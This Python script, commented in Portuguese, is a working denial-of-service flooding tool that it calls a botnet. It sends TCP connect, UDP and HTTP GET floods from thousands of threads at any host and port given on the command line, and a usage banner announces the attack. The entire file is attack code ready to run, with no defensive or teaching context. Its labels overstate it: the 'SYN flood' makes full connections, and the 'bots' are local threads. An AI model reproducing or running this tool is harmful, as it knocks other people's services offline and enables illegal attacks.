import socket
import threading
import time
import random
import sys
import ssl
import colorama
from concurrent.futures import ThreadPoolExecutor

colorama.init(autoreset=True)

# Cores ANSI para console
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
WHITE = '\033[97m'
RESET = '\033[0m'

class DDoSLayer:
    def __init__(self, target_host, target_port, attack_type="tcp", log_status=False):
        self.target_host = target_host
        self.target_port = target_port
        self.attack_type = attack_type
        self.log_status = log_status
        self.running = True
        
    def log(self, message, color=WHITE):
        """Log com cores personalizadas"""
        if self.log_status:
            timestamp = time.strftime("%H:%M:%S")
            print(f"{RED}[{timestamp}] {color}{message}{RESET}")
    
    def tcp_flood(self):
        """Ataque TCP SYN flood"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_host, self.target_port))
                sock.close()
                self.log("Request Sent !", WHITE)
            except Exception as e:
                self.log("Conexão falhada !", WHITE)
                continue
    
    def udp_flood(self):
        """Ataque UDP flood"""
        data = bytes(random.randint(65, 122) for _ in range(1024))
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (self.target_host, self.target_port))
                sock.close()
                self.log("Request Sent !", WHITE)
            except Exception as e:
                self.log("Conexão falhada !", WHITE)
                continue
    
    def http_flood(self):
        """Ataque HTTP GET flood"""
        headers = [
            "User-Agent: Mozilla/5.0",
            "Accept: */*",
            "Connection: keep-alive"
        ]
        request = f"GET / HTTP/1.1\r\n{'\r\n'.join(headers)}\r\n\r\n"
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_host, self.target_port))
                sock.sendall(request.encode())
                sock.close()
                self.log("Request Sent !", WHITE)
            except Exception as e:
                self.log("Conexão falhada !", WHITE)
                continue

class BotNet:
    def __init__(self, target_host, target_port, attack_type="tcp", 
                 num_bots=10000, max_workers=None, log_status=True):
        self.target_host = target_host
        self.target_port = target_port
        self.attack_type = attack_type
        self.num_bots = num_bots
        self.max_workers = max_workers or min(num_bots, 1000)
        self.running = False
        self.log_status = log_status
        
    def create_bots(self):
        """Cria botnets usando pool de threads"""
        layers = []
        for _ in range(self.num_bots):
            layer = DDoSLayer(self.target_host, self.target_port, 
                             self.attack_type, self.log_status)
            layers.append(layer)
        return layers
    
    def start_attack(self):
        """Inicia o ataque DDoS"""
        self.running = True
        bots = self.create_bots()
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for bot in bots:
                if self.attack_type == "tcp":
                    future = executor.submit(bot.tcp_flood)
                elif self.attack_type == "udp":
                    future = executor.submit(bot.udp_flood)
                else:
                    future = executor.submit(bot.http_flood)
                futures.append(future)
                
            # Mantém o ataque rodando
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\nEncerrando botnet...")
                self.stop_attack()
    
    def stop_attack(self):
        """Para o ataque DDoS"""
        self.running = False

# Exemplo de uso
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: python ddos_botnet.py <host> <port> [attack_type] [num_bots]")
        sys.exit(1)
        
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    attack_type = sys.argv[3] if len(sys.argv) > 3 else "tcp"
    num_bots = int(sys.argv[4]) if len(sys.argv) > 4 else 10000
    
    botnet = BotNet(target_host, target_port, attack_type, num_bots)
    print(f"{RED}[STATUS] Iniciando ataque DDoS para {target_host}:{target_port}")
    print(f"{RED}[STATUS] Tipo de ataque: {attack_type}")
    print(f"{RED}[STATUS] Número de bots: {num_bots}")
    
    try:
        botnet.start_attack()
    except KeyboardInterrupt:
        print("\nBotnet interrompida pelo usuário")
